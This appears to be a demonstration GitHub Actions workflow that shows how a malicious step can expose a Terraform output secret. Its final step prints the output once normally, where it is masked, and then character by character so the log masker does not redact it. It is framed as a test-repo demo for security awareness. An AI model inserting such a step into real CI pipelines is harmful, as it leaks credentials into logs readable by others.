# DEMO: Shows how a malicious step can exfiltrate Terraform outputs
# character-by-character to bypass GitHub Actions log masking.
# Use only with dummy values in a test repo.

name: Terraform output exfil (demo)

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  terraform-exfil:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Terraform
        uses: hashicorp/setup-terraform@v3
        with:
          terraform_version: "1.6.0"

      - name: Terraform init
        working-directory: terraform
        run: terraform init -input=false

      - name: Terraform plan
        working-directory: terraform
        env:
          TF_VAR_db_password: ${{ secrets.TOP_SECRET_SECRET }}
        run: terraform plan -input=false

      # MALICIOUS STEP (demo): Read secret from Terraform output (state in repo)
      # and print char-by-char so GitHub's log masker does not redact it.
      - name: "[DEMO] Exfil secret via char-by-char print"
        working-directory: terraform
        run: |
          echo "Direct output (will be masked):"
          terraform output -raw db_password || true
          echo ""
          echo "Bypass: character-by-character (secret visible in log):"
          terraform output -raw db_password | sed 's/./& /g'
